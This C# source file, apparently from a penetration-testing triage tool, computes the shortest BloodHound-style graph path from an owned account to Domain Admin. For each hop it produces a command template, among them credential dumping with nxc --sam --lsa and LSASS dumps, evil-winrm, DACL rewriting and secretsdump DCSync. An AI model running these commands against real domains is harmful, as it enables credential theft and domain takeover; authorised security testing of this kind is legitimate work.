using ZeroDayTriage.Core.Abstractions;
using ZeroDayTriage.Core.Model;
using ZeroDayTriage.Reasoning.Graph;

namespace ZeroDayTriage.Reasoning.Rules;

/// <summary>
/// The signature BloodHound capability: build the attack graph from collected edges and compute
/// the shortest path from an owned foothold to a high-value target (Domain Admins / a DCSync-capable
/// principal). This is the "given these findings, what is the shortest route to Domain Admin?"
/// reasoning, turned into a concrete, tool-by-tool plan.
/// </summary>
public sealed class ShortestPathToDomainAdminRule : IAttackPathRule
{
    private static readonly HashSet<string> WellKnownHighValue = new(StringComparer.OrdinalIgnoreCase)
    {
        "domain admins", "enterprise admins", "administrators", "domain controllers", "schema admins",
    };

    public string Id => "AD-SHORTEST-PATH";

    public string Description => "Graph shortest path from an owned foothold to Domain Admin.";

    public AssetDomain Domain => AssetDomain.ActiveDirectory;

    public IEnumerable<AttackPath> Evaluate(FindingCorpus findings)
    {
        var graph = new AttackGraph(findings.All);
        if (graph.EdgeCount == 0)
        {
            yield break;
        }

        var seeds = OwnedSeeds(findings).ToList();
        if (seeds.Count == 0)
        {
            yield break;
        }

        var goals = GoalNodes(findings);
        if (goals.Count == 0)
        {
            yield break;
        }

        var hops = graph.ShortestPath(seeds, node => goals.Contains(node));
        if (hops is null || hops.Count == 0)
        {
            yield break;
        }

        var steps = hops.Select((hop, i) => new AttackStep
        {
            Action = DescribeEdge(hop),
            Tooling = ToolingForEdge(hop),
            Phase = i == hops.Count - 1 ? KillChainPhase.LootAndPivot : KillChainPhase.Exploit,
            Technique = TechniqueForEdge(hop.EdgeType),
            EvidenceFindingIds = new[] { hop.FindingId },
        }).ToList();

        var start = hops[0].From;
        var goal = hops[^1].To;
        var startConfirmed = findings.ForPrincipal(start).Any(f => f.HasTag("valid-credential"));

        yield return new AttackPath
        {
            Name = $"Shortest path to {goal}: {start} -> {goal} ({hops.Count} hop(s))",
            Objective = "Domain Admin via the shortest graph path",
            Domain = AssetDomain.ActiveDirectory,
            Phase = MissionPhase.PrivilegeEscalation,
            Impact = Severity.Critical,
            Confidence = startConfirmed ? Confidence.Confirmed : Confidence.Probable,
            Rationale =
                $"From owned principal {start}, BloodHound-style path-finding reaches {goal} in {hops.Count} hop(s): " +
                string.Join(" -> ", new[] { start }.Concat(hops.Select(h => $"[{h.EdgeType}] {h.To}"))) + ".",
            Steps = steps,
        };
    }

    private static IEnumerable<string> OwnedSeeds(FindingCorpus findings) =>
        findings.WithTag("valid-credential")
            .Concat(findings.WithTag("kerberoastable"))
            .Concat(findings.WithTag("asreproastable"))
            .Where(f => !string.IsNullOrWhiteSpace(f.Principal))
            .Select(f => f.Principal!)
            .Distinct();

    private static HashSet<string> GoalNodes(FindingCorpus findings)
    {
        var goals = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var wk in WellKnownHighValue)
        {
            goals.Add(FindingCorpus.Normalize(wk));
        }

        foreach (var hv in findings.WithTag("highvalue"))
        {
            var target = hv.Property("target") ?? hv.Principal;
            if (target is not null)
            {
                goals.Add(FindingCorpus.Normalize(target));
            }
        }

        // Controlling a principal that can DCSync is game over.
        foreach (var dc in findings.WithTag("dcsync"))
        {
            if (dc.Principal is not null)
            {
                goals.Add(FindingCorpus.Normalize(dc.Principal));
            }
        }

        return goals;
    }

    private static string DescribeEdge(PathHop hop) => hop.EdgeType.ToLowerInvariant() switch
    {
        "memberof" => $"Inherit the privileges of {hop.To} through {hop.From}'s group membership.",
        "adminto" => $"Use {hop.From}'s local-admin rights on {hop.To} to execute code and dump credentials.",
        "hassession" => $"You control {hop.From}; dump the logged-on session of {hop.To} from its memory.",
        "canpsremote" => $"PSRemote from {hop.From} onto {hop.To}.",
        "canrdp" => $"RDP from {hop.From} onto {hop.To}.",
        "executedcom" => $"Execute via DCOM from {hop.From} onto {hop.To}.",
        "forcechangepassword" => $"Force-reset {hop.To}'s password using {hop.From}.",
        "dcsync" => $"DCSync the domain using {hop.From}'s replication rights to own {hop.To}.",
        _ => $"Abuse {hop.From}'s {hop.EdgeType} over {hop.To} to take it over.",
    };

    private static string ToolingForEdge(PathHop hop) => hop.EdgeType.ToLowerInvariant() switch
    {
        "memberof" => "(no command — membership already grants the rights once you control the source)",
        "adminto" => $"nxc smb {hop.To} -u {hop.From} -p <secret> --sam --lsa",
        "hassession" => $"nxc smb {hop.From} ... --lsa   # or pypykatz on the LSASS dump",
        "canpsremote" => $"evil-winrm -i {hop.To} -u {hop.From} -p <secret>",
        "canrdp" => $"xfreerdp /v:{hop.To} /u:{hop.From} /p:<secret>",
        "executedcom" => $"impacket-dcomexec {hop.From}:<secret>@{hop.To}",
        "forcechangepassword" => $"net rpc password {hop.To} -U <dom>/{hop.From}",
        "genericwrite" => $"targetedKerberoast / Set-DomainObject -Identity {hop.To}",
        "writedacl" => $"dacledit.py -target {hop.To} -principal {hop.From} -action write -rights FullControl",
        "dcsync" => $"secretsdump.py -just-dc <DOMAIN>/{hop.From}@<DC>",
        _ => $"bloodyAD abuse {hop.EdgeType} {hop.From} -> {hop.To}",
    };

    private static string TechniqueForEdge(string edgeType) => edgeType.ToLowerInvariant() switch
    {
        "adminto" => "T1078.002",
        "hassession" => "T1003.001",
        "canpsremote" => "T1021.006",
        "canrdp" => "T1021.001",
        "executedcom" => "T1021.003",
        "dcsync" => "T1003.006",
        "memberof" => "T1078",
        _ => "T1222",
    };
}
